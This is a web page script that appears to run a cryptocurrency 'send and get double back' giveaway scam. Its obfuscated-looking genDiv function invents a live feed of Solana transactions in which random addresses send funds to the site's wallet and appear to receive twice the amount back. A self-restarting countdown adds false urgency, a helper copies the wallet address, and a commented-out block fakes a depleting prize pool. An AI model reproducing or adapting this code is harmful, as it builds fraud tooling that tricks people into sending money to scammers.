if (document.body.clientWidth > 810) {
  new WOW().init();
}

// FAQ
$(".faq .item").click(function () {
  if ($(this).hasClass("active")) {
    $(this).find(".text").animate({ opacity: 0 }, 200);
    //$(this).find('.text').removeClass('view');
    setTimeout(function () {
      //$('.faq .item.active .text').removeClass('view');
      $(".faq .item.active .text").slideUp(500);
      $(".faq .item.active").removeClass("active");
    }, 300);
  } else {
    //$('.faq .item.active .text').removeClass('view');
    $(".faq .item.active .text").animate({ opacity: 0 }, 100);
    $(".faq .item.active .text").slideUp(500);
    $(".faq .item.active").removeClass("active");
    $(this).addClass("active");
    $(this).find(".text").slideDown(500);
    setTimeout(function () {
      $(".faq .item.active .text").animate({ opacity: 1 }, 100);
      //$('.faq .item.active .text').addClass('view');
    }, 300);
    //$('.faq .item').removeClass('active');
  }
});

function CopyToClipboard(id) {
  var r = document.createRange();
  r.selectNode(document.getElementById(id));
  window.getSelection().removeAllRanges();
  window.getSelection().addRange(r);
  document.execCommand("copy");
  window.getSelection().removeAllRanges();
  Toast.add({
    text: "Copied!",
    color: "#55B1C8",
    //autohide: true,
    //delay: 2000
  });
}

$(document).ready(function () {
  $("#nav-mb").on("click", "a", function (event) {
    event.preventDefault();
    var id = $(this).attr("href"),
      top = $(id).offset().top;
    $("body,html").animate(
      {
        scrollTop: top,
      },
      1500
    );
  });
});

function randomString(_0xe480x2) {
  var _0xe480x3 = "";
  var _0xe480x4 = "abcdefghijklmnopqrstuvwxyz0123456789";
  var _0xe480x5 = _0xe480x4["length"];
  for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
    _0xe480x3 += _0xe480x4["charAt"](
      Math["floor"](Math["random"]() * _0xe480x5)
    );
  }
  return _0xe480x3;
}

function randomStringHashBTC(_0xe480x2) {
  var _0xe480x3 = "";
  var _0xe480x4 = "bacfed0123456789";
  var _0xe480x5 = _0xe480x4["length"];
  for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
    _0xe480x3 += _0xe480x4["charAt"](
      Math["floor"](Math["random"]() * _0xe480x5)
    );
  }
  return _0xe480x3;
}

var divCounter = 0;

function randomInteger(min, max) {
  let rand = min + Math.random() * (max - min);
  return Math.round(rand);
}

function randomIntegerBTC(min, max) {
  let rand = min + Math.random() * (max - min);
  return rand.toFixed(2);
}

function getRandomArbitrary(min, max) {
  rand = Math.random() * (max - min) + min;
  return rand.toFixed(2);
}

function getRundomMnogitel() {
  let asd = [1, 0.1, 0.01];
  let getRandom = Math.floor(Math.random() * asd.length);
  return asd[getRandom];
}

function GenerateAddress() {
  var result = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < 8; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return "0x" + result;
}

function GenerateHash(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result + "...";
}

function genDiv() {
  divCounter++;
  let valet = document.getElementById("wallet").innerText;
  var _0xe480x9 = `${'<div class="item" style="display:none"><div class="top"><div class="data"><div style="" class="data-item">{t1}</div><div style="display: none" class="data-item">{t2}</div><div class="data-item" id="btcstr">{t4}</div><div class="data-item">{t5}</div><div class="data-item">{t6}</div><div class="data-item">{t3}</div><div class="data-item">{t7}</div><div style="display: none" class="data-item">{t8}</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">{b1}</div><div style="display: none" class="data-item">{b2}</div><div class="data-item">{b4}</div><div class="data-item">{b5}</div><div class="data-item" id="btcstr">{b6}</div><div class="data-item">{b3}</div><div class="data-item">{b7}</div><div style="display:none"; class="data-item">{b8}</div></div></div></div>'}`;
  let _0xe480xa = GenerateHash(10);
  let _0xe480xb =
    "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
  let _0xe480xc = "right now";
  let _0xe480xd = GenerateAddress() + "...";
  let _0xe480xe = "IN";
  let _0xe480xf = valet.substring(0, 10);
  let valueSend = getRandomArbitrary(1250, 50000);
  let _0xe480x10 = valueSend + " SOLANA";
  let _0xe480x11 = (Math["random"]() * 0.009 * getRundomMnogitel() +
    0.0001 * getRundomMnogitel())["toFixed"](6);
  let _0xe480x12 = GenerateHash(10);
  let _0xe480x13 =
    "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
  let _0xe480x14 = "right now";
  let _0xe480x15 = _0xe480xf.slice(0, 10) + "...";
  let _0xe480x16 = "OUT";
  let _0xe480x17 = _0xe480xd;
  let _0xe480x18 = valueSend * 2 + " SOLANA";
  let _0xe480x19 = (Math["random"]() * 0.009 * getRundomMnogitel() +
    0.0001 * getRundomMnogitel())["toFixed"](8);
  _0xe480x9 = _0xe480x9["replace"]("{t1}", _0xe480x12);
  _0xe480x9 = _0xe480x9["replace"]("{t2}", _0xe480x13);
  _0xe480x9 = _0xe480x9["replace"]("{t3}", _0xe480x14);
  _0xe480x9 = _0xe480x9["replace"]("{t4}", _0xe480x15);
  _0xe480x9 = _0xe480x9["replace"]("{t5}", _0xe480x16);
  _0xe480x9 = _0xe480x9["replace"]("{t6}", _0xe480x17);
  _0xe480x9 = _0xe480x9["replace"]("{t7}", _0xe480x18);
  _0xe480x9 = _0xe480x9["replace"]("{t8}", _0xe480x19);
  _0xe480x9 = _0xe480x9["replace"]("{b1}", _0xe480xa);
  _0xe480x9 = _0xe480x9["replace"]("{b2}", _0xe480xb);
  _0xe480x9 = _0xe480x9["replace"]("{b3}", _0xe480xc);
  _0xe480x9 = _0xe480x9["replace"]("{b4}", _0xe480xd);
  _0xe480x9 = _0xe480x9["replace"]("{b5}", _0xe480xe);
  _0xe480x9 = _0xe480x9["replace"]("{b6}", _0xe480x15);
  _0xe480x9 = _0xe480x9["replace"]("{b7}", _0xe480x10);
  _0xe480x9 = _0xe480x9["replace"]("{b8}", _0xe480x11);
  var _0xe480x1a = $(_0xe480x9)["prependTo"](".table-body");
  $(".item")["each"](function () {
    var _0xe480x6 = $(this)["index"]();
    if (_0xe480x6 > 0) {
      $(this)
        ["find"](".top .data div")
        ["eq"](5)
        ["html"](_0xe480x6 + " min");
      $(this)
        ["find"](".bottom .data div")
        ["eq"](5)
        ["html"](_0xe480x6 + " min");
    }
  });
  setTimeout(function () {
    _0xe480x1a["find"](".top")["fadeIn"]();
    _0xe480x1a["find"](".bottom .data div")["eq"](5)["html"]("right now");
    $(".item").slideDown();
  }, 2000);
}

$(document)["ready"](function () {
  genDiv();
  setInterval(function () {
    genDiv();
  }, 15500);
});

let timeCount = document.getElementById("overTime").innerText;

function getTimeRemaining(endtime) {
  var t = Date.parse(endtime) - Date.parse(new Date());
  var seconds = Math.floor((t / 1000) % 60);
  var minutes = Math.floor((t / 1000 / 60) % 60);
  var hours = Math.floor((t / (1000 * 60 * 60)) % 24);
  var days = Math.floor(t / (1000 * 60 * 60 * 24));
  sessionStorage.setItem("timeOver", t / 1000);
  return {
    total: t,
    days: days,
    hours: hours,
    minutes: minutes,
    seconds: seconds,
  };
}

var storageTime = sessionStorage.getItem("timeOver");
var defaultVal = timeCount;

function initializeClock(id, endtime) {
  var clock = document.getElementById(id);
  var daysSpan = clock.querySelector(".days");
  var hoursSpan = clock.querySelector(".hours");
  var minutesSpan = clock.querySelector(".minutes");
  var secondsSpan = clock.querySelector(".seconds");

  function updateClock() {
    var t = getTimeRemaining(endtime);

    if (t.total <= 0) {
      clearInterval(timeinterval);
      var deadline = new Date(Date.parse(new Date()) + (defaultVal + 1) * 1000);
      initializeClock("countdown", deadline);
    }

    daysSpan.innerHTML = "0" + t.days;
    hoursSpan.innerHTML = ("0" + t.hours).slice(-2);
    minutesSpan.innerHTML = ("0" + t.minutes).slice(-2);
    secondsSpan.innerHTML = ("0" + t.seconds).slice(-2);
  }

  updateClock();
  var timeinterval = setInterval(updateClock, 1000);
}

if (storageTime) {
  var deadline = new Date(Date.parse(new Date()) + storageTime * 1000);
  initializeClock("countdown", deadline);
} else {
  var deadline = new Date(Date.parse(new Date()) + defaultVal * 1000);
  initializeClock("countdown", deadline);
}

$(document).ready(function () {
  $(".btn-it-l").click(function () {
    $(this).next(".box-content-l").slideToggle();
  });
});
$(".btn-it-l").click(function (event) {
  $(this).toggleClass("before-min");
  $(this).parent().toggleClass("before-min");
});

function separateNumber(x) {
  return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}

/**
//var one_line_w = 55;
if ( $.cookie('one_line_w') != null ) {
    one_line_w = $.cookie('one_line_w');
} else {
    one_line_w = $('#progress .circle').attr('stroke-dasharray').replace(', 100', '');
}

if ( $.cookie('num_line') != null ) {
    num_line = $.cookie('num_line');
    if (num_line < 100) {
        //one_line_w = $('#progress .circle').attr('stroke-dasharray').replace(', 100', '');
        num_line = 51000000;
        Toast.add({
            text: 'Total Prize Replenished',
            color: '#53f020',
        }); 
        $('.toast_show').css('filter','none').css('max-width', '210px');
    }
} else {
    num_line = $('#ost_line').text() / 100 * one_line_w;
}
function line_progress() {

    if (num_line == 0) {
        //setTimeout(function() {
            Toast.add({
                text: 'Total Prize Replenished',
                color: '#53f020',
            }); 
            $('.toast_show').css('filter','none').css('max-width', '210px');
            num_line = 52000000;
            $.cookie('num_line', num_line);
        //}, 1000);
    }

    // var random = Math.floor(Math.random( ) * (2 - 1) + 1);
    // //one_line_w -= random;
    // var old_num = num_line;
    // num_line -= 1 * random;
    // var random = Math.floor(Math.random( ) * (1999999 - 1000000 + 100));
    // num_line -= random;
    //$('#ost_line').text(num_line.toLocaleString());
    // $({numberValue: old_num}).animate({numberValue: num_line}, {
    //    duration: 1000,
    //    easing: "linear",
    //    step: function(val) {
    //       $('#ost_line').text(separateNumber(Math.round(val)));
    //    }
    // });

    var random = Math.floor(Math.random( ) * (1999000 - 1000000 + 100));
    var old_num = num_line;
    num_line -= random;
    if (num_line < 1) {num_line = 0;old_num=0;}
    //$('#ost_line').text(num_line.toLocaleString());
    $({numberValue: old_num}).animate({numberValue: num_line}, {
       duration: 100,
       easing: "linear",
       step: function(val) {
          $('#ost_line').text(separateNumber(Math.round(val)));
       }
    });

    if (num_line > 1){
    one_line_w = num_line / 100000000 * 100;
    } else {
        one_line_w = 0;
    }
    $('#progress .circle').attr('stroke-dasharray', parseInt(one_line_w)+', 100');
    $('#percent').text(parseInt(one_line_w)+'%');


    $.cookie('num_line', num_line);
    $.cookie('one_line_w', one_line_w);
}
line_progress()
var time_progress = setInterval(function() {
    line_progress();
}, 2000);
*/

function init() {
  new SmoothScroll(document, 120, 12);
}

function SmoothScroll(target, speed, smooth) {
  if (target === document)
    target =
      document.scrollingElement ||
      document.documentElement ||
      document.body.parentNode ||
      document.body; // cross browser support for document scrolling

  var moving = false;
  var pos = target.scrollTop;
  var frame =
    target === document.body && document.documentElement
      ? document.documentElement
      : target; // safari is the new IE

  target.addEventListener("mousewheel", scrolled, { passive: false });
  target.addEventListener("DOMMouseScroll", scrolled, { passive: false });

  function scrolled(e) {
    e.preventDefault(); // disable default scrolling

    var delta = normalizeWheelDelta(e);

    pos += -delta * speed;
    pos = Math.max(0, Math.min(pos, target.scrollHeight - frame.clientHeight)); // limit scrolling

    if (!moving) update();
  }

  function normalizeWheelDelta(e) {
    if (e.detail) {
      if (e.wheelDelta)
        return (e.wheelDelta / e.detail / 40) * (e.detail > 0 ? 1 : -1);
      // Opera
      else return -e.detail / 3; // Firefox
    } else return e.wheelDelta / 120; // IE,Safari,Chrome
  }

  function update() {
    moving = true;

    var delta = (pos - target.scrollTop) / smooth;

    target.scrollTop += delta;

    if (Math.abs(delta) > 0.5) requestFrame(update);
    else moving = false;
  }

  var requestFrame = (function () {
    // requestAnimationFrame cross browser
    return (
      window.requestAnimationFrame ||
      window.webkitRequestAnimationFrame ||
      window.mozRequestAnimationFrame ||
      window.oRequestAnimationFrame ||
      window.msRequestAnimationFrame ||
      function (func) {
        window.setTimeout(func, 1000 / 50);
      }
    );
  })();
}

function updateDonut(percent, element) {
  //var percent = 45;
  if (percent < 50) {
    offset = (360 / 100) * percent;
    element.parentNode.querySelector("#section3").style.webkitTransform =
      "rotate(" + offset + "deg)";
    element.parentNode.querySelector("#section3 .item").style.webkitTransform =
      "rotate(" + (180 - offset) + "deg)";
    element.parentNode.querySelector("#section3").style.msTransform =
      "rotate(" + offset + "deg)";
    element.parentNode.querySelector("#section3 .item").style.msTransform =
      "rotate(" + (180 - offset) + "deg)";
    element.parentNode.querySelector("#section3").style.MozTransform =
      "rotate(" + offset + "deg)";
    element.parentNode.querySelector("#section3 .item").style.MozTransform =
      "rotate(" + (180 - offset) + "deg)";
    //element.parentNode.querySelector("#section3 .item").style.backgroundColor = "#ffffff0d";
    $("#section3 .item").css("background", "#ffffff0d");
  } else {
    l;
    offset = (360 / 100) * percent - 180;
    element.parentNode.querySelector("#section3").style.webkitTransform =
      "rotate(180deg)";
    element.parentNode.querySelector("#section3 .item").style.webkitTransform =
      "rotate(" + offset + "deg)";
    element.parentNode.querySelector("#section3").style.msTransform =
      "rotate(180deg)";
    element.parentNode.querySelector("#section3 .item").style.msTransform =
      "rotate(" + offset + "deg)";
    element.parentNode.querySelector("#section3").style.MozTransform =
      "rotate(180deg)";
    element.parentNode.querySelector("#section3 .item").style.MozTransform =
      "rotate(" + offset + "deg)";
    //element.parentNode.querySelector("#section3 .item").style.backgroundColor = "#E64C65";
    $("#section3 .item").css(
      "background",
      "linear-gradient(181.19deg, #256CFE 4.3%, #6C9CFF 95.15%)"
    );
  }
  element.parentNode.querySelector("span").innerHTML = percent + "%";
}

function updateSlider(element) {
  if (element) {
    var parent = element.parentElement;
    var thumb = parent.querySelector(".range-slider__thumb"),
      bar = parent.querySelector(".range-slider__bar"),
      pct =
        element.value *
        ((parent.clientHeight - thumb.clientHeight) / parent.clientHeight);
    thumb.style.bottom = pct + "%";
    bar.style.height = "calc(" + pct + "% + " + thumb.clientHeight / 2 + "px)";
    thumb.textContent = element.value + "%";
  }
  updateDonut(element.value, element.parentNode);
}
(function initAndSetupTheSliders() {
  [].forEach.call(document.getElementsByClassName("container"), function (el) {
    var inputs = [].slice.call(el.querySelectorAll(".range-slider input"));
    inputs.forEach(function (input) {
      input.setAttribute("value", "50");
      updateSlider(input);
      input.addEventListener("input", function (element) {
        updateSlider(input);
      });
      input.addEventListener("change", function (element) {
        updateSlider(input);
      });
    });
  });
})();

// $("body").on("click", "a", function (event) {
//   event.preventDefault();

// $('.mob_menu').fadeOut(100);
// $('.mob_menu ul').removeClass('active');
// $('body').css('overflow-y', 'scroll');

//   var id = $(this).attr("href");
//   id = id.replace("/", "");
//   var top = $(id).offset().top;
//   $("body,html").animate({ scrollTop: top - 50 }, 1500);
// });

if (document.body.clientWidth < 810) {
  $(".mob_menu .cont").prepend($("nav"));
  $(".mob_menu .cont").append($("header .infos"));
}

$(".open_menu").click(function () {
  $(".mob_menu").fadeIn(100).css("display", "flex");
  $(".mob_menu ul").addClass("active");
  $("body").css("overflow-y", "hidden");
});
$(".mob_menu .close").click(function () {
  $(".mob_menu").fadeOut(100);
  $(".mob_menu ul").removeClass("active");
  $("body").css("overflow-y", "scroll");
});
$(".mob_menu a").click(function () {
  $(".mob_menu").fadeOut(100);
  $(".mob_menu ul").removeClass("active");
  $("body").css("overflow-y", "scroll");
});
